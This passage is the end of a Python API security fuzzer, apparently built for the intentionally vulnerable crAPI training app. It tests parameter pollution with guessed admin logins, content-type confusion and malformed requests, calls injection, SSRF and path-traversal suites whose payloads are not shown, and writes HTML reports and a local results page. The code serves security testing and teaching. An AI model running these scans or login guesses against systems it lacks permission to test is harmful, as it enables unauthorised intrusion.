            ("POST", "/identity/api/auth/login", {"email": ["test@test.com", "admin@admin.com"], "password": ["test", "admin"]}),
        ]
        
        for method, endpoint, params in hpp_endpoints:
            # Test with duplicate parameters in query string
            if method == "GET":
                query_parts = []
                for key, values in params.items():
                    for val in values:
                        query_parts.append(f"{key}={val}")
                full_url = f"{endpoint}?{'&'.join(query_parts)}"
                result = self.test_endpoint(
                    method, full_url, {},
                    "Parameter Pollution", Severity.MEDIUM,
                    f"Testing HPP on {endpoint}"
                )
            else:
                # For POST, test with duplicate keys in JSON (shouldn't work but test anyway)
                result = self.test_endpoint(
                    method, endpoint, params,
                    "Parameter Pollution", Severity.MEDIUM,
                    f"Testing HPP on {endpoint}"
                )
            
            if result.status_code == 200:
                # Check if multiple values were processed
                if any(str(v) in result.response_body for values in params.values() for v in values):
                    result.vulnerable = True
                    result.description = f"Parameter pollution successful on {endpoint}"
            self.print_result(result)
            time.sleep(0.05)
    
    def test_content_type_manipulation(self):
        """Test content type manipulation and content-type confusion"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing Content Type Manipulation{Colors.END}")
        
        if not self.auth_token:
            print(f"  {Colors.YELLOW}⚠ No auth token, skipping some content type tests{Colors.END}")
            return
        
        content_type_tests = [
            ("POST", "/identity/api/auth/login", {"email": "test@test.com", "password": "test"}, "application/xml"),
            ("POST", "/identity/api/auth/login", {"email": "test@test.com", "password": "test"}, "text/plain"),
            ("POST", "/identity/api/auth/login", {"email": "test@test.com", "password": "test"}, "application/x-www-form-urlencoded"),
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": 1}, "application/xml"),
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": 1}, "text/plain"),
        ]
        
        for method, endpoint, payload, content_type in content_type_tests:
            try:
                headers = self.get_headers()
                headers['Content-Type'] = content_type
                
                if content_type == "application/x-www-form-urlencoded":
                    # Send as form data
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        data=payload,
                        headers=headers,
                        timeout=self.timeout
                    )
                else:
                    # Send as specified content type
                    if content_type == "application/xml":
                        import xml.etree.ElementTree as ET
                        root = ET.Element("root")
                        for k, v in payload.items():
                            child = ET.SubElement(root, k)
                            child.text = str(v)
                        body = ET.tostring(root, encoding='unicode')
                    else:
                        body = str(payload)
                    
                    response = self.session.request(
                        method,
                        f"{self.base_url}{endpoint}",
                        data=body,
                        headers=headers,
                        timeout=self.timeout
                    )
                
                response_body = response.text[:1000] if response.text else ""
                
                result = TestResult(
                    endpoint=endpoint,
                    method=method,
                    vulnerability="Content Type Manipulation",
                    payload=str(payload),
                    status_code=response.status_code,
                    response_time=0,
                    response_body=response_body,
                    severity=Severity.MEDIUM,
                    description=f"Testing with content-type: {content_type}",
                    vulnerable=False
                )
                
                # If wrong content type was accepted, it's a vulnerability
                if response.status_code == 200 and content_type != "application/json":
                    result.vulnerable = True
                    result.description = f"Wrong content type accepted: {content_type}"
                elif response.status_code in [400, 415]:
                    if self.detect_information_disclosure(response_body):
                        result.vulnerable = True
                        result.description = f"Information disclosure with content-type: {content_type}"
                
                self.results.append(result)
                self.print_result(result)
                time.sleep(0.05)
            except Exception as e:
                pass
    
    def test_malformed_requests(self):
        """Test with malformed JSON, incomplete requests, etc."""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing Malformed Requests{Colors.END}")
        
        malformed_tests = [
            ("POST", "/identity/api/auth/login", '{"email": "test@test.com", "password": "test"', "Incomplete JSON"),
            ("POST", "/identity/api/auth/login", '{"email": "test@test.com", "password":}', "Missing value"),
            ("POST", "/identity/api/auth/login", '{"email": "test@test.com", "password": "test",}', "Trailing comma"),
            ("POST", "/identity/api/auth/login", '{"email": "test@test.com", "password": "test"}}', "Extra brace"),
            ("POST", "/identity/api/auth/login", '{"email": "test@test.com", "password": "test"', "Unclosed JSON"),
            ("POST", "/identity/api/auth/login", 'email=test@test.com&password=test', "URL encoded instead of JSON"),
        ]
        
        for method, endpoint, payload, description in malformed_tests:
            try:
                headers = self.get_headers()
                headers['Content-Type'] = 'application/json'
                
                response = self.session.request(
                    method,
                    f"{self.base_url}{endpoint}",
                    data=payload,
                    headers=headers,
                    timeout=self.timeout
                )
                
                response_body = response.text[:1000] if response.text else ""
                
                result = TestResult(
                    endpoint=endpoint,
                    method=method,
                    vulnerability="Malformed Request",
                    payload=payload[:200],
                    status_code=response.status_code,
                    response_time=0,
                    response_body=response_body,
                    severity=Severity.MEDIUM,
                    description=f"{description} - {endpoint}",
                    vulnerable=False
                )
                
                # Check for information disclosure in error messages
                if response.status_code in [400, 500]:
                    if self.detect_information_disclosure(response_body):
                        result.vulnerable = True
                        result.description = f"Information disclosure with malformed request: {description}"
                    # Also check if malformed request was processed (shouldn't be)
                    if response.status_code == 200:
                        result.vulnerable = True
                        result.description = f"Malformed request accepted: {description}"
                
                self.results.append(result)
                self.print_result(result)
                time.sleep(0.05)
            except Exception as e:
                pass
    
    def run_all_tests(self, skip_auth=False):
        """Run all security tests"""
        self.print_banner()
        
        # Authenticate first (unless skipped)
        if not skip_auth and not self.auth_token:
            print(f"\n{Colors.BOLD}[*] Authenticating...{Colors.END}")
            self.authenticate()
        elif skip_auth:
            print(f"\n{Colors.YELLOW}⚠ Skipping authentication (--no-auth flag){Colors.END}")
        
        # Run all test suites
        self.test_sql_injection()
        self.test_nosql_injection()
        self.test_command_injection()
        self.test_broken_authentication()
        self.test_broken_access_control()
        self.test_security_misconfiguration()
        self.test_ssrf()
        self.test_mass_assignment()
        self.test_path_traversal()
        self.test_information_disclosure()
        self.test_rate_limiting()
        self.test_all_methods_on_endpoints()
        self.test_authenticated_endpoints()
        self.test_low_severity_vulnerabilities()
        self.test_crapi_challenges()
        self.test_unexpected_inputs()
        self.test_all_endpoints_from_spec()
        self.test_parameter_pollution()
        self.test_content_type_manipulation()
        self.test_malformed_requests()
        
        # Post-process all results: Check for information disclosure in "safe" responses
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Post-processing: Checking all responses for information disclosure...{Colors.END}")
        reclassified = 0
        for result in self.results:
            if not result.vulnerable and result.status_code > 0 and result.response_body:
                # Check for information disclosure
                if self.detect_information_disclosure(result.response_body):
                    result.vulnerable = True
                    if result.vulnerability not in ["Information Disclosure", "Excessive Data Exposure"]:
                        result.vulnerability = f"{result.vulnerability} + Information Disclosure"
                    result.description = f"{result.description} | INFO DISCLOSURE: Sensitive data exposed"
                    result.severity = Severity.MEDIUM if result.severity == Severity.INFO else result.severity
                    reclassified += 1
                # Check for excessive data exposure in 200 responses
                elif result.status_code == 200:
                    if self.detect_excessive_data_exposure(result.response_body, {}):
                        result.vulnerable = True
                        if result.vulnerability not in ["Information Disclosure", "Excessive Data Exposure"]:
                            result.vulnerability = f"{result.vulnerability} + Excessive Data Exposure"
                        result.description = f"{result.description} | EXCESSIVE DATA: More data exposed than necessary"
                        result.severity = Severity.MEDIUM if result.severity == Severity.INFO else result.severity
                        reclassified += 1
        
        if reclassified > 0:
            print(f"{Colors.YELLOW}  ⚠ Reclassified {reclassified} 'safe' responses as vulnerable due to information disclosure{Colors.END}")
        
        # Print summary
        self.print_summary()
        
        # Generate report
        self.generate_html_report()
    
    def print_summary(self):
        """Print test summary"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}TEST SUMMARY{Colors.END}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")
        
        total = len(self.results)
        vulnerable = sum(1 for r in self.results if r.vulnerable)
        
        # Count by severity - ALL tests, not just vulnerable
        by_severity_all = {}
        by_severity_vuln = {}
        for severity in Severity:
            by_severity_all[severity] = sum(1 for r in self.results if r.severity == severity)
            by_severity_vuln[severity] = sum(1 for r in self.results if r.severity == severity and r.vulnerable)
        
        print(f"Total Tests:     {total}")
        print(f"{Colors.RED}Vulnerable:      {vulnerable}{Colors.END}")
        print(f"{Colors.GREEN}Safe:            {total - vulnerable}{Colors.END}\n")
        
        print(f"{Colors.BOLD}Vulnerabilities by Severity:{Colors.END}")
        for severity in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
            vuln_count = by_severity_vuln.get(severity, 0)
            total_count = by_severity_all.get(severity, 0)
            if vuln_count > 0 or total_count > 0:
                if severity == Severity.CRITICAL:
                    color = Colors.RED
                elif severity == Severity.HIGH:
                    color = Colors.YELLOW
                elif severity == Severity.MEDIUM:
                    color = Colors.CYAN
                elif severity == Severity.LOW:
                    color = Colors.BLUE
                else:
                    color = Colors.GRAY
                print(f"  {severity.value:10}: {color}{vuln_count}/{total_count}{Colors.END} (vulnerable/total)")
        
        print(f"\n{Colors.BOLD}Vulnerable Endpoints (showing all severities):{Colors.END}")
        vulnerable_results = [r for r in self.results if r.vulnerable]
        # Sort by severity
        severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2, Severity.LOW: 3, Severity.INFO: 4}
        vulnerable_results_sorted = sorted(vulnerable_results, key=lambda x: severity_order.get(x.severity, 5))
        
        for result in vulnerable_results_sorted[:20]:  # Show first 20
            if result.severity == Severity.CRITICAL:
                icon_color = Colors.RED
            elif result.severity == Severity.HIGH:
                icon_color = Colors.YELLOW
            elif result.severity == Severity.MEDIUM:
                icon_color = Colors.CYAN
            elif result.severity == Severity.LOW:
                icon_color = Colors.BLUE
            else:
                icon_color = Colors.GRAY
            
            print(f"  {icon_color}✗{Colors.END} {result.method:6} {result.endpoint:50} [{result.severity.value}]")
        
        if len(vulnerable_results_sorted) > 20:
            print(f"  ... and {len(vulnerable_results_sorted) - 20} more")
    
    def generate_html_report(self, filename=None):
        """Generate HTML report"""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>crAPI Security Fuzzer Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
        .summary {{ background: white; padding: 20px; margin: 20px 0; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .vulnerable {{ background: #fee; border-left: 4px solid #c00; }}
        .safe {{ background: #efe; border-left: 4px solid #0c0; }}
        .result {{ padding: 15px; margin: 10px 0; border-radius: 5px; }}
        .severity-critical {{ color: #c00; font-weight: bold; }}
        .severity-high {{ color: #f80; font-weight: bold; }}
        .severity-medium {{ color: #fa0; }}
        .severity-low {{ color: #08f; }}
        table {{ width: 100%; border-collapse: collapse; background: white; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background: #34495e; color: white; }}
        .code {{ background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔒 crAPI Security Fuzzer Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Base URL: {self.base_url}</p>
    </div>
    
    <div class="summary">
        <h2>Summary</h2>
        <p><strong>Total Tests:</strong> {len(self.results)}</p>
        <p><strong style="color: #c00;">Vulnerable:</strong> {sum(1 for r in self.results if r.vulnerable)}</p>
        <p><strong style="color: #0c0;">Safe:</strong> {len(self.results) - sum(1 for r in self.results if r.vulnerable)}</p>
    </div>
    
    <div class="summary">
        <h2>Vulnerable Endpoints</h2>
        <table>
            <tr>
                <th>Method</th>
                <th>Endpoint</th>
                <th>Vulnerability</th>
                <th>Severity</th>
                <th>Status</th>
            </tr>
"""
        
        vulnerable_results = [r for r in self.results if r.vulnerable]
        for result in vulnerable_results:
            severity_class = f"severity-{result.severity.value.lower()}"
            html += f"""
            <tr class="vulnerable">
                <td><span class="code">{result.method}</span></td>
                <td><span class="code">{result.endpoint}</span></td>
                <td>{result.vulnerability}</td>
                <td class="{severity_class}">{result.severity.value}</td>
                <td>{result.status_code}</td>
            </tr>
"""
        
        html += """
        </table>
    </div>
    
    <div class="summary">
        <h2>All Test Results</h2>
        <table>
            <tr>
                <th>Method</th>
                <th>Endpoint</th>
                <th>Vulnerability</th>
                <th>Severity</th>
                <th>Status</th>
                <th>Vulnerable</th>
            </tr>
"""
        
        for result in self.results:
            row_class = "vulnerable" if result.vulnerable else "safe"
            severity_class = f"severity-{result.severity.value.lower()}"
            html += f"""
            <tr class="{row_class}">
                <td><span class="code">{result.method}</span></td>
                <td><span class="code">{result.endpoint}</span></td>
                <td>{result.vulnerability}</td>
                <td class="{severity_class}">{result.severity.value}</td>
                <td>{result.status_code}</td>
                <td>{'Yes' if result.vulnerable else 'No'}</td>
            </tr>
"""
        
        html += """
        </table>
    </div>
</body>
</html>
"""
        
        if filename is None:
            filename = f"fuzzer_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        
        with open(filename, 'w') as f:
            f.write(html)
        
        print(f"\n{Colors.GREEN}✓ HTML report generated: {filename}{Colors.END}")
        return filename
    
    def start_web_interface(self, port: int = 9999):
        """Start a web server to display results"""
        class FuzzerHandler(BaseHTTPRequestHandler):
            fuzzer_instance = self
            
            def do_GET(self):
                if self.path == '/' or self.path == '/index.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    html = self.generate_web_ui()
                    self.wfile.write(html.encode())
                elif self.path == '/api/results':
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    # Convert results to JSON-serializable format
                    results_data = []
                    for r in self.fuzzer_instance.results:
                        result_dict = {
                            'endpoint': r.endpoint,
                            'method': r.method,
                            'vulnerability': r.vulnerability,
                            'payload': r.payload[:200] if len(r.payload) > 200 else r.payload,
                            'status_code': r.status_code,
                            'response_time': round(r.response_time, 2),
                            'response_body': r.response_body[:500] if len(r.response_body) > 500 else r.response_body,
                            'severity': r.severity.value,
                            'description': r.description,
                            'vulnerable': r.vulnerable
                        }
                        results_data.append(result_dict)
                    
                    summary = {
                        'total': len(self.fuzzer_instance.results),
                        'vulnerable': sum(1 for r in self.fuzzer_instance.results if r.vulnerable),
                        'safe': sum(1 for r in self.fuzzer_instance.results if not r.vulnerable),
                        'by_severity': {}
                    }
                    
                    for severity in Severity:
                        summary['by_severity'][severity.value] = {
                            'vulnerable': sum(1 for r in self.fuzzer_instance.results if r.severity == severity and r.vulnerable),
                            'total': sum(1 for r in self.fuzzer_instance.results if r.severity == severity)
                        }
                    
                    response = {
                        'summary': summary,
                        'results': results_data,
                        'base_url': self.fuzzer_instance.base_url,
                        'timestamp': datetime.now().isoformat()
                    }
                    self.wfile.write(json.dumps(response).encode())
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def log_message(self, format, *args):
                pass  # Suppress log messages
            
            def generate_web_ui(self):
                vulnerable_count = sum(1 for r in self.fuzzer_instance.results if r.vulnerable)
                total_count = len(self.fuzzer_instance.results)
                
                # Count by severity
                severity_counts = {}
                for severity in Severity:
                    severity_counts[severity.value] = {
                        'vulnerable': sum(1 for r in self.fuzzer_instance.results if r.severity == severity and r.vulnerable),
                        'total': sum(1 for r in self.fuzzer_instance.results if r.severity == severity)
                    }
                
                vulnerable_results = [r for r in self.fuzzer_instance.results if r.vulnerable]
                
                html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>crAPI Security Fuzzer - Results</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }}
        .container {{
            max-width: 1400px;
            margin: 0 auto;
        }}
        .header {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }}
        .header h1 {{
            color: #2c3e50;
            font-size: 2.5em;
            margin-bottom: 10px;
        }}
        .header .meta {{
            color: #7f8c8d;
            font-size: 0.9em;
        }}
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }}
        .stat-card {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            text-align: center;
        }}
        .stat-card h3 {{
            color: #7f8c8d;
            font-size: 0.9em;
            text-transform: uppercase;
            margin-bottom: 10px;
        }}
        .stat-card .value {{
            font-size: 2.5em;
            font-weight: bold;
            margin: 10px 0;
        }}
        .stat-card.total .value {{ color: #3498db; }}
        .stat-card.vulnerable .value {{ color: #e74c3c; }}
        .stat-card.safe .value {{ color: #27ae60; }}
        .severity-badge {{
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: bold;
            text-transform: uppercase;
        }}
        .severity-critical {{ background: #e74c3c; color: white; }}
        .severity-high {{ background: #e67e22; color: white; }}
        .severity-medium {{ background: #f39c12; color: white; }}
        .severity-low {{ background: #3498db; color: white; }}
        .severity-info {{ background: #95a5a6; color: white; }}
        .content-section {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }}
        .content-section h2 {{
            color: #2c3e50;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #ecf0f1;
        }}
        .vulnerability-item {{
            background: #fff5f5;
            border-left: 4px solid #e74c3c;
            padding: 20px;
            margin-bottom: 15px;
            border-radius: 5px;
            transition: transform 0.2s;
        }}
        .vulnerability-item.low-severity {{
            background: #f0f7ff;
            border-left: 4px solid #3498db;
        }}
        .vulnerability-item.info-severity {{
            background: #f8f9fa;
            border-left: 4px solid #95a5a6;
        }}
        .vulnerability-item:hover {{
            transform: translateX(5px);
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }}
        .vulnerability-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }}
        .endpoint-info {{
            font-family: 'Courier New', monospace;
            background: #f8f9fa;
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 0.9em;
        }}
        .method-badge {{
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.8em;
            margin-right: 10px;
        }}
        .method-get {{ background: #3498db; color: white; }}
        .method-post {{ background: #27ae60; color: white; }}
        .method-put {{ background: #f39c12; color: white; }}
        .method-delete {{ background: #e74c3c; color: white; }}
        .payload {{
            background: #fff9e6;
            padding: 10px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            margin-top: 10px;
            word-break: break-all;
        }}
        .response-info {{
            margin-top: 10px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 4px;
            font-size: 0.85em;
        }}
        .status-code {{
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .status-200 {{ background: #27ae60; color: white; }}
        .status-400 {{ background: #f39c12; color: white; }}
        .status-500 {{ background: #e74c3c; color: white; }}
        .status-0 {{ background: #95a5a6; color: white; }}
        .severity-stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }}
        .severity-stat {{
            padding: 15px;
            background: #f8f9fa;
            border-radius: 5px;
            text-align: center;
        }}
        .severity-stat .label {{
            font-size: 0.85em;
            color: #7f8c8d;
            margin-bottom: 5px;
        }}
        .severity-stat .count {{
            font-size: 1.8em;
            font-weight: bold;
        }}
        .refresh-btn {{
            background: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            margin-bottom: 20px;
        }}
        .refresh-btn:hover {{
            background: #2980b9;
        }}
        .empty-state {{
            text-align: center;
            padding: 40px;
            color: #7f8c8d;
        }}
        .empty-state-icon {{
            font-size: 4em;
            margin-bottom: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 crAPI Security Fuzzer Results</h1>
            <div class="meta">
                <p><strong>Base URL:</strong> {self.fuzzer_instance.base_url}</p>
                <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card total">
                <h3>Total Tests</h3>
                <div class="value">{total_count}</div>
            </div>
            <div class="stat-card vulnerable">
                <h3>Vulnerable</h3>
                <div class="value">{vulnerable_count}</div>
            </div>
            <div class="stat-card safe">
                <h3>Safe</h3>
                <div class="value">{total_count - vulnerable_count}</div>
            </div>
        </div>
        
        <div class="content-section">
            <h2>Vulnerabilities by Severity</h2>
            <div class="severity-stats">
"""
                
                for severity in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
                    counts = severity_counts.get(severity.value, {'vulnerable': 0, 'total': 0})
                    if counts['total'] > 0:
                        # Color coding for severity
                        if severity == Severity.CRITICAL:
                            color = '#e74c3c'
                        elif severity == Severity.HIGH:
                            color = '#e67e22'
                        elif severity == Severity.MEDIUM:
                            color = '#f39c12'
                        elif severity == Severity.LOW:
                            color = '#3498db'
                        else:
                            color = '#95a5a6'
                        
                        html += f"""
                <div class="severity-stat">
                    <div class="label">{severity.value}</div>
                    <div class="count" style="color: {color}">
                        {counts['vulnerable']}/{counts['total']}
                    </div>
                    <div style="font-size: 0.8em; color: #7f8c8d;">vulnerable/total</div>
                </div>
"""
                
                html += """
            </div>
        </div>
        
        <div class="content-section">
            <h2>Vulnerable Endpoints ({})</h2>
""".format(len(vulnerable_results))
                
                if vulnerable_results:
                    # Sort by severity (Critical first, then High, Medium, Low, Info)
                    severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2, Severity.LOW: 3, Severity.INFO: 4}
                    vulnerable_results_sorted = sorted(vulnerable_results, key=lambda x: severity_order.get(x.severity, 5))
                    
                    for result in vulnerable_results_sorted:
                        method_class = f"method-{result.method.lower()}"
                        status_class = f"status-{result.status_code}" if result.status_code > 0 else "status-0"
                        severity_class = result.severity.value.lower()
                        item_class = "vulnerability-item"
                        if severity_class == "low":
                            item_class += " low-severity"
                        elif severity_class == "info":
                            item_class += " info-severity"
                        
                        html += f"""
            <div class="{item_class}">
                <div class="vulnerability-header">
                    <div>
                        <span class="method-badge {method_class}">{result.method}</span>
                        <span class="endpoint-info">{result.endpoint}</span>
                    </div>
                    <div>
                        <span class="severity-badge severity-{severity_class}">{result.severity.value}</span>
                        <span class="status-code {status_class}">{result.status_code if result.status_code > 0 else 'N/A'}</span>
                    </div>
                </div>
                <div style="margin-top: 10px;">
                    <strong>Vulnerability:</strong> {result.vulnerability}<br>
                    <strong>Description:</strong> {result.description}
                </div>
                <div class="payload">
                    <strong>Payload:</strong> {result.payload[:300] if len(result.payload) > 300 else result.payload}
                </div>
                <div class="response-info">
                    <strong>Response Time:</strong> {result.response_time:.2f}s
                    {f'<br><strong>Response Body (preview):</strong> <pre style="white-space: pre-wrap; max-height: 100px; overflow-y: auto;">{result.response_body[:500]}</pre>' if result.response_body else ''}
                </div>
            </div>
"""
                else:
                    html += """
            <div class="empty-state">
                <div class="empty-state-icon">✅</div>
                <h3>No Vulnerabilities Found!</h3>
                <p>All tested endpoints appear to be secure.</p>
            </div>
"""
                
                html += """
        </div>
    </div>
    
    <script>
        // Auto-refresh every 5 seconds if fuzzer is still running
        setTimeout(function() {
            location.reload();
        }, 5000);
    </script>
</body>
</html>
"""
                return html
        
        # Find an available port
        for test_port in range(port, port + 10):
            try:
                server = HTTPServer(('localhost', test_port), type('Handler', (BaseHTTPRequestHandler,), {
                    'do_GET': FuzzerHandler.do_GET,
                    'log_message': FuzzerHandler.log_message,
                    'generate_web_ui': FuzzerHandler.generate_web_ui,
                    'fuzzer_instance': self
                }))
                server_port = test_port
                break
            except OSError:
                continue
        else:
            print(f"{Colors.YELLOW}⚠ Could not find available port for web interface{Colors.END}")
            return None
        
        def run_server():
            server.serve_forever()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        
        url = f"http://localhost:{server_port}"
        print(f"\n{Colors.GREEN}✓ Web interface started on {url}{Colors.END}")
        print(f"{Colors.CYAN}  Opening in browser...{Colors.END}")
        
        # Try to open in browser
        try:
            webbrowser.open(url)
        except:
            pass
        
        return server_port

def main():
    parser = argparse.ArgumentParser(description='OWASP Top 10 API Fuzzer for crAPI')
    parser.add_argument('-u', '--url', default='http://localhost:8888',
                       help='Base URL of the API (default: http://localhost:8888)')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('--no-auth', action='store_true',
                       help='Skip authentication')
    parser.add_argument('--no-web', action='store_true',
                       help='Skip web interface')
    parser.add_argument('--web-port', type=int, default=9999,
                       help='Port for web interface (default: 9999)')
    parser.add_argument('--all', action='store_true',
                       help='Run tests both with and without authentication')
    
    args = parser.parse_args()
    
    # If --all is specified, run tests twice
    if args.all:
        print(f"\n{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}║  Running Comprehensive Tests: With AND Without Auth        ║{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        # First run: WITH authentication
        print(f"\n{Colors.BOLD}{Colors.GREEN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}PHASE 1: Testing WITH Authentication{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}{'='*60}{Colors.END}\n")
        
        fuzzer_auth = APIFuzzer(base_url=args.url, timeout=args.timeout)
        fuzzer_auth.run_all_tests(skip_auth=False)
        
        # Second run: WITHOUT authentication
        print(f"\n{Colors.BOLD}{Colors.YELLOW}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}PHASE 2: Testing WITHOUT Authentication{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}{'='*60}{Colors.END}\n")
        
        fuzzer_no_auth = APIFuzzer(base_url=args.url, timeout=args.timeout)
        fuzzer_no_auth.run_all_tests(skip_auth=True)
        
        # Combine results
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}COMBINED RESULTS SUMMARY{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.END}\n")
        
        all_results = fuzzer_auth.results + fuzzer_no_auth.results
        total_tests = len(all_results)
        vulnerable = sum(1 for r in all_results if r.vulnerable)
        safe = total_tests - vulnerable
        
        # Count by severity
        critical = sum(1 for r in all_results if r.vulnerable and r.severity == Severity.CRITICAL)
        high = sum(1 for r in all_results if r.vulnerable and r.severity == Severity.HIGH)
        medium = sum(1 for r in all_results if r.vulnerable and r.severity == Severity.MEDIUM)
        low = sum(1 for r in all_results if r.vulnerable and r.severity == Severity.LOW)
        
        print(f"{Colors.BOLD}Total Tests (Combined):     {total_tests}{Colors.END}")
        print(f"{Colors.RED}Vulnerable:                {vulnerable}{Colors.END}")
        print(f"{Colors.GREEN}Safe:                      {safe}{Colors.END}")
        print(f"\n{Colors.BOLD}Vulnerabilities by Severity:{Colors.END}")
        print(f"  {Colors.RED}CRITICAL  : {critical}{Colors.END}")
        print(f"  {Colors.YELLOW}HIGH      : {high}{Colors.END}")
        print(f"  {Colors.CYAN}MEDIUM    : {medium}{Colors.END}")
        print(f"  {Colors.BLUE}LOW       : {low}{Colors.END}")
        
        # Use the authenticated fuzzer instance for web interface (has more results)
        fuzzer = fuzzer_auth
        fuzzer.results = all_results  # Replace with combined results
        
        # Generate combined HTML report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"fuzzer_report_all_{timestamp}.html"
        fuzzer.generate_html_report(report_file)
        print(f"\n{Colors.GREEN}✓ Combined HTML report generated: {report_file}{Colors.END}")
        
    else:
        # Normal single run
        fuzzer = APIFuzzer(base_url=args.url, timeout=args.timeout)
        fuzzer.run_all_tests(skip_auth=args.no_auth)
    
    # Start web interface unless disabled
    if not args.no_web:
        web_port = fuzzer.start_web_interface(port=args.web_port)
        if web_port:
            print(f"\n{Colors.BOLD}Web interface is running at http://localhost:{web_port}{Colors.END}")
            print(f"{Colors.BOLD}Press Ctrl+C to stop.{Colors.END}")
            try:
                # Keep the server running
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")

if __name__ == "__main__":
    main()

